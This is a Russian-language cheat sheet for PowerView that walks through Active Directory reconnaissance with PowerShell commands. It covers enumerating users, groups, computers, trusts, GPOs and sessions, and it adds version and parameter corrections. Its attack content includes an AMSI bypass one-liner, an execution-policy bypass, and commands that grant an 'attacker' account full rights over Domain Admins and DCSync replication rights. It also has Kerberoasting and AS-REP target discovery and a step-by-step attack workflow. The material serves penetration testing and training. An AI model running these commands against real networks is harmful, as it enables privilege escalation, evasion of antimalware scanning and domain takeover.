<a id="-powerview---powershell-ad-enumeration"></a>
# ⚡ PowerView — сбор сведений об AD с помощью PowerShell

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md) • [🏠 Русская главная](../../README.ru.md)

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ██╗   ██╗██╗███████╗██╗    ██╗
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██║   ██║██║██╔════╝██║    ██║
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝██║   ██║██║█████╗  ██║ █╗ ██║
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██║██╔══╝  ██║███╗██║
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║ ╚████╔╝ ██║███████╗╚███╔███╔╝
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝ ╚══╝╚══╝ 
                  PowerShell Active Directory Recon
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerView-Active_Directory-blue?style=for-the-badge" alt="PowerView">
  <img src="https://img.shields.io/badge/PowerShell-red?style=for-the-badge" alt="PowerShell">
</p>

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [Что такое PowerView](#-what-is-powerview)
- [Подготовка](#-setup)
- [Сбор сведений о домене](#-domain-enumeration)
- [Сбор сведений о пользователях](#-user-enumeration)
- [Сбор сведений о группах](#-group-enumeration)
- [Сбор сведений о компьютерах](#-computer-enumeration)
- [Анализ списков управления доступом (ACL)](#-acl-enumeration)
- [Сбор сведений о доверительных отношениях](#-trust-enumeration)
- [Сбор сведений о групповых политиках (GPO)](#-gpo-enumeration)
- [Поиск сеансов и административного доступа](#-hunting)
- [Краткий справочник](#-quick-reference)

---

<a id="-what-is-powerview"></a>
## 🎯 Что такое PowerView

**PowerView** — инструмент PowerShell для сбора сведений об Active Directory (AD) и использования ошибок настройки:

- 🔍 **Сбор сведений** (enumeration) — пользователи, группы, компьютеры и групповые политики (GPO)
- 🔐 **ACL** (списки управления доступом) — поиск некорректно назначенных разрешений
- 🌐 **Доверительные отношения** (trusts) — построение карты связей между доменами
- 🎯 **Поиск сеансов** (hunting) — определение компьютеров, на которых работают пользователи

---

<a id="-setup"></a>
## 🚀 Подготовка

<a id="download-powerview"></a>
### Загрузка PowerView

> **Версии и комплект:** PowerView входит в PowerSploit; репозиторий архивирован и больше не поддерживается. Утверждение о включении PowerView.ps1 в SharpHound/BloodHound не следует считать универсальным: SharpHound — отдельный сборщик. Примеры оригинала сохранены. См. [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) и [SharpHound CE](https://bloodhound.specterops.io/collect-data/ce-collection/sharphound).

```powershell
# Из PowerSploit
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

# Из SharpHound
# PowerView.ps1 входит в комплект BloodHound
```

<a id="import-module"></a>
### Импорт модуля

```powershell
# Обойти политику выполнения
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Импорт
Import-Module .\PowerView.ps1

# Или подключить скрипт через dot sourcing
. .\PowerView.ps1
```

<a id="amsi-bypass-if-needed"></a>
### Обход AMSI (при необходимости)

> **Версионное уточнение:** ExecutionPolicy регулирует запуск скриптов и не отключает AMSI. Ниже сохранён исторический пример обращения к внутреннему полю PowerShell; его работоспособность зависит от реализации и версии и не гарантируется в современных средах. См. [политики выполнения](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies) и [описание AMSI](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal).

```powershell
# Простой обход
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

<a id="-domain-enumeration"></a>
## 🏢 Сбор сведений о домене

<a id="basic-domain-info"></a>
### Основные сведения о домене

```powershell
# Получить сведения о домене
Get-Domain

# Получить SID домена
Get-DomainSID

# Получить политику домена
Get-DomainPolicy

# Получить список контроллеров домена
Get-DomainController
Get-DomainController -Domain other.domain.local

# Получить сведения о лесе
Get-Forest
Get-ForestDomain
```

<a id="domain-policy"></a>
### Политика домена

```powershell
# Политика паролей
(Get-DomainPolicy)."SystemAccess"

# Политика Kerberos
(Get-DomainPolicy)."KerberosPolicy"
```

---

<a id="-user-enumeration"></a>
## 👤 Сбор сведений о пользователях

<a id="list-users"></a>
### Список пользователей

```powershell
# Все пользователи
Get-DomainUser

# Конкретный пользователь
Get-DomainUser -Identity admin

# Свойства пользователя
Get-DomainUser -Identity admin -Properties *
Get-DomainUser -Identity admin -Properties samaccountname,description

# Пользователи с заполненным описанием
Get-DomainUser -LDAPFilter "(description=*)" | Select-Object samaccountname,description
```

<a id="find-interesting-users"></a>
### Поиск интересующих учётных записей

> **Уточнение adminCount:** атрибут показывает, что система меняла ACL объекта из-за административного членства; сам по себе он не доказывает текущее членство в защищённой группе. Фильтр описания также ищет текст, а не подтверждает наличие действительного пароля. См. [Microsoft: Admin-Count](https://learn.microsoft.com/en-us/windows/win32/adschema/a-admincount).

```powershell
# Пользователи со SPN (кандидаты для Kerberoasting)
Get-DomainUser -SPN

# Пользователи без предварительной аутентификации (AS-REP)
Get-DomainUser -PreauthNotRequired

# Пользователи с adminCount (защищённые)
Get-DomainUser -AdminCount

# Пользователи с паролями в описании
Get-DomainUser -LDAPFilter "(description=*pass*)" | Select-Object samaccountname,description
```

<a id="user-sessions"></a>
### Сеансы пользователей

> **Уточнение:** Find-LocalAdminAccess находит компьютеры, где текущая учётная запись имеет права локального администратора, а не перечисляет всех пользователей с такими правами. См. [документацию функции](https://powersploit.readthedocs.io/en/latest/Recon/Find-LocalAdminAccess/).

```powershell
# Где у пользователя есть сеанс
Find-DomainUserLocation -UserIdentity admin

# Найти пользователей с административным доступом
Find-LocalAdminAccess
```

---

<a id="-group-enumeration"></a>
## 👥 Сбор сведений о группах

<a id="list-groups"></a>
### Список групп

```powershell
# Все группы
Get-DomainGroup

# Конкретная группа
Get-DomainGroup -Identity "Domain Admins"

# Участники группы
Get-DomainGroupMember -Identity "Domain Admins"

# Участники с учётом вложенных групп
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

<a id="important-groups"></a>
### Важные группы

```powershell
# Domain Admins — администраторы домена
Get-DomainGroupMember -Identity "Domain Admins"

# Enterprise Admins — администраторы предприятия
Get-DomainGroupMember -Identity "Enterprise Admins"

# Administrators — администраторы
Get-DomainGroupMember -Identity "Administrators"

# Найти группы, в которые входит пользователь
Get-DomainGroup -UserName admin
```

<a id="local-groups"></a>
### Локальные группы

```powershell
# Локальные администраторы компьютера
Get-NetLocalGroupMember -ComputerName server01

# Локальные администраторы на всех компьютерах
Find-DomainLocalGroupMember -GroupName Administrators
```

---

<a id="-computer-enumeration"></a>
## 💻 Сбор сведений о компьютерах

<a id="list-computers"></a>
### Список компьютеров

```powershell
# Все компьютеры
Get-DomainComputer

# Конкретный компьютер
Get-DomainComputer -Identity server01

# Свойства
Get-DomainComputer -Properties operatingsystem,serviceprincipalname

# Компьютеры с неограниченным делегированием
Get-DomainComputer -Unconstrained
```

<a id="find-targets"></a>
### Поиск целевых объектов

```powershell
# Контроллеры домена
Get-DomainController

# Серверы
Get-DomainComputer -OperatingSystem "*Server*"

# Windows 10
Get-DomainComputer -OperatingSystem "*Windows 10*"

# Старые ОС
Get-DomainComputer -OperatingSystem "*2008*"
```

<a id="shares"></a>
### Общие файловые ресурсы

> **Исправление подписи:** -CheckShareAccess проверяет возможность чтения содержимого общего ресурса текущим пользователем, а не право записи. Команда и подпись оригинала сохранены. См. [Find-DomainShare](https://powersploit.readthedocs.io/en/latest/Recon/Find-DomainShare/).

```powershell
# Найти общие ресурсы
Find-DomainShare

# Общие ресурсы с правом записи
Find-DomainShare -CheckShareAccess

# Интересующие файлы в общих ресурсах
Find-InterestingDomainShareFile
Find-InterestingDomainShareFile -Include *.txt,*.doc,*.xlsx
```

---

<a id="-acl-enumeration"></a>
## 🔐 Анализ списков управления доступом (ACL)

<a id="basic-acl"></a>
### Основные запросы ACL

```powershell
# ACL пользователя
Get-DomainObjectAcl -Identity admin

# Разрешить GUID в названия прав
Get-DomainObjectAcl -Identity admin -ResolveGUIDs

# Конкретные права
Get-DomainObjectAcl -Identity admin -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll"}
```

<a id="find-interesting-acls"></a>
### Поиск интересующих разрешений ACL

```powershell
# GenericAll для пользователя
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll" -and $_.SecurityIdentifier -match "S-1-5-21-.*-1107"}

# WriteProperty — изменение свойств
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty"}

# WriteDacl — изменение ACL
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteDacl"}
```

<a id="dcsync-rights"></a>
### Права DCSync

> **Уточнение фильтров ACL:** выборка ACE по имени права не равна оценке эффективного доступа конкретной учётной записи: важны субъект, объект, наследование и запреты. OR-фильтр ниже не доказывает наличие совокупности прав репликации, требуемых для DCSync. См. [Get-DomainObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/) и [условия DCSync](https://bloodhound.specterops.io/resources/edges/dc-sync).

```powershell
# Найти права DCSync
Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match "Replication-Get") -or ($_.ActiveDirectoryRights -match "GenericAll")}
```

<a id="modify-acl"></a>
### Изменение ACL

> **Уточнение объекта:** в первом примере TargetIdentity указывает группу Domain Admins, а PrincipalIdentity — получателя разрешений. Следовательно, подпись «для пользователя» не означает, что изменяется ACL объекта пользователя. См. [Add-DomainObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/).

```powershell
# Добавить пользователю GenericAll
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All

# Добавить права DCSync
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

---

<a id="-trust-enumeration"></a>
## 🤝 Сбор сведений о доверительных отношениях

<a id="domain-trusts"></a>
### Доверительные отношения доменов

```powershell
# Получить доверительные отношения
Get-DomainTrust

# Все доверительные отношения
Get-DomainTrust -Domain domain.local

# Построить карту всех доверительных отношений
Get-DomainTrustMapping
```

<a id="forest-trusts"></a>
### Доверительные отношения лесов

```powershell
# Доверительные отношения лесов
Get-ForestTrust

# Домены леса
Get-ForestDomain
```

<a id="trust-types"></a>
### Типы доверительных отношений

| Тип доверия | Направление | Описание |
|------------|-----------|-------------|
| Bidirectional (двустороннее) | В обе стороны | Оба домена доверяют друг другу |
| Inbound (входящее) | В одну сторону | Другой домен доверяет нашему |
| Outbound (исходящее) | В одну сторону | Наш домен доверяет другому |

---

<a id="-gpo-enumeration"></a>
## 📜 Сбор сведений о групповых политиках (GPO)

<a id="list-gpos"></a>
### Список GPO

> **Уточнение области:** -ComputerIdentity выбирает GPO, относящиеся к указанному компьютеру, а не служит выбором конкретного OU. Фильтры ACL следующего раздела не устанавливают, какой именно пользователь имеет эффективное право изменения. См. [Get-DomainGPO](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO/).

```powershell
# Все GPO
Get-DomainGPO

# GPO по имени
Get-DomainGPO -Identity "Default Domain Policy"

# GPO для конкретного OU
Get-DomainGPO -ComputerIdentity server01
```

<a id="find-gpo-permissions"></a>
### Поиск разрешений для GPO

```powershell
# GPO, которые пользователь может изменять
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty" -or $_.ActiveDirectoryRights -match "GenericAll"}
```

<a id="gpo-locations"></a>
### Область применения GPO

```powershell
# OU, к которым привязана GPO
Get-DomainOU -GPLink "{GPO-GUID}"

# GPO на конкретном компьютере
Get-DomainGPO -ComputerIdentity "server01"
```

---

<a id="-hunting"></a>
## 🎯 Поиск сеансов и административного доступа

<a id="find-admin-access"></a>
### Поиск административного доступа

> **Совместимость:** -ComputerFile отсутствует в рассматриваемой версии PowerSploit; пример сохранён из оригинала и может завершиться ошибкой. Доступные параметры зависят от версии. См. [Find-LocalAdminAccess](https://powersploit.readthedocs.io/en/latest/Recon/Find-LocalAdminAccess/).

```powershell
# Где у нас есть права локального администратора?
Find-LocalAdminAccess

# С параллельными потоками
Find-LocalAdminAccess -Threads 10

# На конкретных компьютерах
Find-LocalAdminAccess -ComputerFile computers.txt
```

<a id="find-user-locations"></a>
### Поиск компьютеров с сеансами пользователей

> **Уточнение:** -CheckAccess проверяет наличие у текущего пользователя локальных административных прав на компьютерах с найденными сеансами; это не просто проверка доступности узла. См. [Find-DomainUserLocation](https://powersploit.readthedocs.io/en/latest/Recon/Find-DomainUserLocation/).

```powershell
# Где у пользователя есть сеанс?
Find-DomainUserLocation

# Конкретный пользователь
Find-DomainUserLocation -UserIdentity admin

# Только компьютеры, к которым у нас есть доступ
Find-DomainUserLocation -CheckAccess
```

<a id="find-sessions"></a>
### Поиск сеансов

```powershell
# Сеансы на компьютере
Get-NetSession -ComputerName dc01

# Пользователи с открытыми сеансами
Get-NetLoggedon -ComputerName server01

# Сеансы RDP
Get-NetRDPSession -ComputerName server01
```

<a id="hunt-specific-users"></a>
### Поиск конкретных пользователей

> **Имена и режимы:** в исходном PowerView Invoke-UserHunter — псевдоним Find-DomainUserLocation, а -Stealth ограничивает выбор серверов для опроса и не гарантирует незаметность. Аналогично -UserName у Get-DomainGroup — допустимый псевдоним MemberIdentity, а -PreauthNotRequired — параметр архивной версии; ветки и справка могут различаться. См. [исходный PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1), [Get-DomainGroup](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGroup/) и [Find-DomainUserLocation](https://powersploit.readthedocs.io/en/latest/Recon/Find-DomainUserLocation/).

```powershell
# Найти администраторов домена
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# Проверить, где у них есть сеансы
Invoke-UserHunter

# Режим пониженной активности (stealth)
Invoke-UserHunter -Stealth
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

<a id="essential-commands"></a>
### Основные команды

| Команда | Описание |
|---------|-------------|
| `Get-Domain` | Сведения о домене |
| `Get-DomainUser` | Список пользователей |
| `Get-DomainGroup` | Список групп |
| `Get-DomainComputer` | Список компьютеров |
| `Get-DomainController` | Список контроллеров домена |
| `Get-DomainTrust` | Список доверительных отношений |
| `Get-DomainGPO` | Список GPO |
| `Find-LocalAdminAccess` | Поиск административного доступа |
| `Find-DomainUserLocation` | Поиск сеансов пользователей |

<a id="kerberos-targets"></a>
### Объекты для атак на Kerberos

| Команда | Описание |
|---------|-------------|
| `Get-DomainUser -SPN` | Кандидаты для Kerberoasting |
| `Get-DomainUser -PreauthNotRequired` | Кандидаты для AS-REP roasting |
| `Get-DomainComputer -Unconstrained` | Неограниченное делегирование |

<a id="common-filters"></a>
### Распространённые фильтры

```powershell
# Выбор свойств
Get-DomainUser -Properties samaccountname,description

# Фильтр LDAP
Get-DomainUser -LDAPFilter "(description=*admin*)"

# Условие Where
Get-DomainUser | ? {$_.samaccountname -like "*svc*"}
```

<a id="attack-workflow"></a>
### Последовательность атаки

```powershell
# 1. Импорт
Import-Module .\PowerView.ps1

# 2. Собрать сведения о домене
Get-Domain
Get-DomainController

# 3. Найти пользователей
Get-DomainUser -SPN | Select samaccountname
Get-DomainUser -PreauthNotRequired

# 4. Найти административный доступ
Find-LocalAdminAccess

# 5. Найти сеансы пользователей
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# 6. Проверить ACL
Get-DomainObjectAcl -Identity admin -ResolveGUIDs
```

---

<a id="-resources"></a>
## 📚 Ресурсы

- [PowerView на GitHub](https://github.com/PowerShellMafia/PowerSploit)
- [Блог HarmJ0y](https://blog.harmj0y.net/)
- [Шпаргалка PowerView](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

<a id="related-cheatsheets"></a>
### Связанные шпаргалки
- [BloodHound](../../BloodHound/translations/README.ru.md)
- [PowerShell](../../PowerShell/translations/README.ru.md)
- [Mimikatz](../../Mimikatz/translations/README.ru.md)

---

<p align="center">
  <b>⚡ Разведка AD с помощью PowerShell!</b><br>
  <i>PowerView — классический инструмент сбора сведений об AD</i>
</p>
